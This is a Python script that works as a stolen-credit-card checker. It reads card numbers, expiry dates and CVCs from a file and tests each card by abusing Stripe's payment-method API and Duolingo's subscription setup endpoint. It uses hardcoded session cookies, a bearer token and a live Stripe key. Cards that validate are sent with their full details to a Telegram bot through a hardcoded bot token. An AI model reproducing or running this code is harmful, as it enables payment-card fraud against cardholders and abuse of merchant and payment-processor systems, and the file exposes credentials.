import requests
import pyfiglet,time
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
token = "7420981888:AAGDi9mXlPfeSXgCH5jr0nX_Ia2q60naJ_w"
ID = "7334648572"
file=open('cc.txt',"+r")
Z = '\033[1;31m'  # أحمر
F = '\033[2;32m'  # أخضر
B = '\033[2;36m'  # سماوي
X = '\033[1;33m'  # أصفر
C = '\033[2;35m'  # أرجواني
start_num = 0
for P in file.readlines():
	start_num += 1
	n = P.split('|')[0]
	mm=P.split('|')[1]
	yy=P.split('|')[2][-2:]
	cvc=P.split('|')[3].replace('\n', '')
	P=P.replace('\n', '')
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F4094b7b36a%3B+stripe-js-v3%2F4094b7b36a%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Far.duolingo.com&time_on_page=127284&client_attribution_metadata[client_session_id]=d0e07057-8fd3-49fa-a8b3-a2a714a7c4bc&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=ca8fa551-c823-446f-b0d5-d6ff84ec8e30&muid=8d445b43-907b-4789-84ed-ac5ac7beb3f5&sid=8d1bd8b9-8cad-46b1-a3ad-9e11e5bb79ec&key=pk_live_wGV2ziRFq7KJLNaVUAJgrzDf&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYpF0FkPZjsuA_Wrk2-ShZMYi2Iaazpx-RQnt9o1kcxI1M97IYfnbVthaWy3u5fn4MORqx0On1W_zFIecQeRsTfzcoMAW6qO5gD0VoOG-S1lnQZJA2qUfFJUVEEUk0nU3c1nprnYDx0tybY87OiQgH3-JvPjwRKihtyxveORoBTPgXUjcrjIGidqOvlFyvevmj2MiIhL0MuU91g_PHsJz6JbKDlNyhLWTjFJ3u1PEhPjvmJzVfqv2WSr26spZ-IK132GMXPbouioLYJcawnp_ZeSjCuawIMcHuCOxTMQgYYBD1THq967G5nwQjefQqXZv4lTEU-ER6V4W7i3KTGXaIfqIgHOgKgZDm65_DcZyuMKfFJG4GeIDqbi-7FAioWHO7QmCFYxRokNmhBL8dtY6QtbiECPeEsMJOKIDyNHr_OJ5CHVe1yQuhKY_R5VBPjiotSSV8_TloVj2RldFnmNlhvcb8xrdx6SFAQQ5ooRckxrdjwleOSqF3x1maXTrNoh9ES9_eFPb-k4dmeGDa-0WoN895MFpZlDFo9oJ8PHhwmYA7YwiyKFd0Zg33ux1ZejhETMdQ6wO_qz9Tf6SwVNHhjXJD79tz7L8Kv6IX8LHQca3Rq8rv5JWjyUO1850TJ7PclGghAcsrKmr9V2kmIJNJuMPZCsPQK10UYAPUSdHZvmQxyEvohO3-ZJvejk42aZazTsM3h5j9ok8KmFeJDRsQ9gXsTFQ7eCKTheW_NpiOerd359IdeD18BRd5RCl8xqCUUC9eBXUh1myLG7MH8Lx_Il6NbaZDU3v3xUGozgNK3uyVoSkZ-KAyCG02tg6cgxZRg81aIEe3NczpRnI9ThikLnxtn3tBswmNthwAxRukSYUWKO_nk8dPzpt8P99BWgI8xSlTyb6tymjeBzZ3BDYdDiuppCHnKRPPNYWasrKZKgtGse7EA2vhPo5yvG9-lplw3FnMtiZGgzA1ajBOEH68UwxD5b0LdDdgkk9piIogKk-bCWCka_GqTH_x0dAkIpYOEKnyeGl3CBkAph2ae-YBR9C7vYMXRTVmB6gZoCMrbCPLu5G-zM5JSIv_cWSUAEF0HN7vq0o35ISf2YawshOujli6fPdrGUh_V8Bu6CtydCO9-ht4i5FkEq0wxsZL-Pqil2Ig2_mr-wot5i1fdmmBDsqFGgypvlqmjqc6RMsHpZuK-Fr797Hh1poVWB8g8N8BFDVwffqdPLBzOvjXNTkmARn9NgdH40I0FYoU7b88jpohPaqp4parw9-7tRI1ghOMPaJv-AdJKP7br53lDxa_w7ZjTqd871XeGAsHFs2qpW5j6Y-ECdzY9cElvSvzN97njEVqFRQfY6Ysnn8TS1QRPTrTtF6sSLKwZi_TOyOUi3ya7vp-DyJNg05IOUSpy_GOd_bl5Ucq9qwNnboDEn2aEbsGJP4ia43ewVMenRGswy8S-0phgdJDkOEAcKQ4MZEL3-6HnSulc0CvQedCdPLI-UFQ98--pmPkT4yNEsOHh1b-CS3E_hvjM3DzAl9Ba9VIt6aX12vQyVntcGhSE3gXkRsr8QKjgTOwE05To0FSqDt05lCp5M7k2C9u6bj-U2IrwK2-GAjjK3N7onX6qwAZnXoLft99deUoYhy3HNi-ra4InbXcN4JsNNSQqZfyifIQWXerz4014sez8OXoS9DFvGh7B2n_RSfrniDURNZdIvXw1i1HXOC8sY9KafTFUSytwZ34FwDFzQ2ek2gEUcSgJiJyMS9NdA_Z22u3e0xDSm_8rBsAet4m_aCnCGGOH8_vXS-7cDf6P96nGiPptS4ctqrthE0hKPf716nBiPoTW3KCb22fyee9mEkUjmrZ8xtFP8W-z1mlbtZmsbskBHcCOUbqwzzBO2qlDiEnfT2n_DuChj0O8D4EX2hfLwOvYeeJWZL5XZV_YVrL7usxmmjTAK5IHsA5UxBvl7ToQFEdr4kDDWBc6rjgkhyoWYVfIAudnNlbVWPdcO4HcXqIMVtjTYjAifLv0zJoJfy0G4feml3SFEDXTKZyqhgo1vVDQLxY-ltbxTIHxxrQIM_Q_ih_0ab8NFcSnVP8RXRxBnGu0q0eBaeVm3kw0ZI6jZXhwzmYtyMioc2hhcmRfaWTOAzGDb6JrcqgxMzc2ZTQ3ZKJwZAA.BSqcjmw_ECz7Ot5pirSypVQQVNs1HwBuVOEcEr0R8xg'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		continue
	import requests
	
	cookies = {
    'lang': 'ar',
    'wuuid': '6448cde6-19e6-45df-b83a-68c679f3f52e',
    'tsl': '1728067825243',
    'lu': 'https://www.duolingo.com/terms',
    'initial_referrer': 'https://www.google.com/',
    '_gcl_au': '1.1.515786960.1728067830',
    '_ga': 'GA1.2.740699894.1728067830',
    '_gid': 'GA1.2.128763607.1728067830',
    '_fbp': 'fb.1.1728067831253.1876031758258155',
    'g_state': '{"i_l":0}',
    'lr': '',
    'jwt_token': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjoxNTg0NDUyMjMyfQ.67h_J0CnTvznNFW0E7D8zzFlPAkDV7ZLMO6n4Uqa3ok',
    'csrf_token': 'ImU1MjAzYTU5ODAyZjQyMGZhMmVjYWUwNDI3NDhkODRiIg==',
    'logged_out_uuid': '1584452232',
    'logged_in': 'true',
    'OptanonConsent': 'isGpcEnabled=0&datestamp=Fri+Oct+04+2024+21%3A53%3A43+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=202404.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=d18e1c42-fc9c-4dd6-ad52-9e783730022c&interactionCount=1&isAnonUser=1&landingPath=https%3A%2F%2Fwww.duolingo.com%2Fterms&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1',
    'AWSALB': 'w8OhfMEjJ2AVGf7lBBLPjT0tPOBkOu5G+tthM9RJ+p9BXKnagTC7okZuhZ3bCUihBb4fxChDNIcp/HsvhquH3W9RDnDSatKTMCVY1wt15Jbll0qMo3dGBKAHGzNR',
    'AWSALBCORS': 'w8OhfMEjJ2AVGf7lBBLPjT0tPOBkOu5G+tthM9RJ+p9BXKnagTC7okZuhZ3bCUihBb4fxChDNIcp/HsvhquH3W9RDnDSatKTMCVY1wt15Jbll0qMo3dGBKAHGzNR',
    '_ga_CSFDVCPQ4F': 'GS1.1.1728067829.1.1.1728068277.60.0.0',
}
	
	headers = {
    'authority': 'www.duolingo.com',
    'accept': 'application/json; charset=UTF-8',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjoxNTg0NDUyMjMyfQ.67h_J0CnTvznNFW0E7D8zzFlPAkDV7ZLMO6n4Uqa3ok',
    'content-type': 'application/json; charset=UTF-8',
    # 'cookie': 'lang=ar; wuuid=6448cde6-19e6-45df-b83a-68c679f3f52e; tsl=1728067825243; lu=https://www.duolingo.com/terms; initial_referrer=https://www.google.com/; _gcl_au=1.1.515786960.1728067830; _ga=GA1.2.740699894.1728067830; _gid=GA1.2.128763607.1728067830; _fbp=fb.1.1728067831253.1876031758258155; g_state={"i_l":0}; lr=; jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjYzMDcyMDAwMDAsImlhdCI6MCwic3ViIjoxNTg0NDUyMjMyfQ.67h_J0CnTvznNFW0E7D8zzFlPAkDV7ZLMO6n4Uqa3ok; csrf_token=ImU1MjAzYTU5ODAyZjQyMGZhMmVjYWUwNDI3NDhkODRiIg==; logged_out_uuid=1584452232; logged_in=true; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Oct+04+2024+21%3A53%3A43+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=202404.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=d18e1c42-fc9c-4dd6-ad52-9e783730022c&interactionCount=1&isAnonUser=1&landingPath=https%3A%2F%2Fwww.duolingo.com%2Fterms&groups=C0001%3A1%2CC0002%3A1%2CC0003%3A1%2CC0004%3A1; AWSALB=w8OhfMEjJ2AVGf7lBBLPjT0tPOBkOu5G+tthM9RJ+p9BXKnagTC7okZuhZ3bCUihBb4fxChDNIcp/HsvhquH3W9RDnDSatKTMCVY1wt15Jbll0qMo3dGBKAHGzNR; AWSALBCORS=w8OhfMEjJ2AVGf7lBBLPjT0tPOBkOu5G+tthM9RJ+p9BXKnagTC7okZuhZ3bCUihBb4fxChDNIcp/HsvhquH3W9RDnDSatKTMCVY1wt15Jbll0qMo3dGBKAHGzNR; _ga_CSFDVCPQ4F=GS1.1.1728067829.1.1.1728068277.60.0.0',
    'idempotency-key': 'pm_1Q6GjUCr1cvUccnXHWa0e7Ca',
    'origin': 'https://www.duolingo.com',
    'referer': 'https://www.duolingo.com/settings/super',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-amzn-trace-id': 'User=1584452232',
    'x-requested-with': 'XMLHttpRequest',
	}
	
	json_data = {
	    'paymentMethodId': id,
	    'product': 'DUOLINGO',
	}
	
	response = requests.post(
	    'https://www.duolingo.com/2017-06-30/users/1584452232/create-setup',
	    cookies=cookies,
	    headers=headers,
	    json=json_data,
	)
	clientSecret=(response.json()['clientSecret'])
	import requests
	
	headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}
	
	data = {
	    'return_url': 'https://www.duolingo.com/super',
	    'payment_method': id,
	    'expected_payment_method_type': 'card',
	    'use_stripe_sdk': 'true',
	    'key': 'pk_live_wGV2ziRFq7KJLNaVUAJgrzDf',
	    'client_secret': clientSecret,
	}
	ids=clientSecret.split('_secret_')[0]
	response = requests.post(
	    f'https://api.stripe.com/v1/setup_intents/{ids}/confirm',
	    headers=headers,
	    data=data,
	)
	ii=(response.text)
	if 'succeeded' in ii or 'success' in ii:
		print(F+f'[ {start_num} ]',P,' ➜ APPROVED  ✅ ')
		requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={ID}&text=
𝗖𝗮𝗿𝗱 -» {P}
         
𝗚𝗮𝘁𝗲𝘄𝗮𝘆  -» STRIPE AUTH

𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅
         
𝗕𝗬 :『@WasSlayer』""")
	elif 'security code is incorrect.' in ii:
			print(F+f'[ {start_num} ]',P,' ➜ EXPIRE  ✅ ')
			requests.post(f"""https://api.telegram.org/bot{token}/sendmessage?chat_id={ID}&text=
𝗖𝗮𝗿𝗱 -» {P}
         
𝗚𝗮𝘁𝗲𝘄𝗮𝘆  -» STRIPE AUTH 

𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» incorrect cvv✅
         
𝗕𝗬 :『@WasSlayer』""")
	else:
		print(Z+f'[ {start_num} ]',P,' ➜ dd ❌')
	time.sleep(5)
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"paymentMethodId":"pm_1PAOoPCr1cvUccnXtfFNpMqa","product":"DUOLINGO"}'
	#response = requests.post(
	#    'https://ar.duolingo.com/2017-06-30/users/1443195368/create-setup',
	#    cookies=cookies,
	#    headers=headers,
	#    data=data,
	#)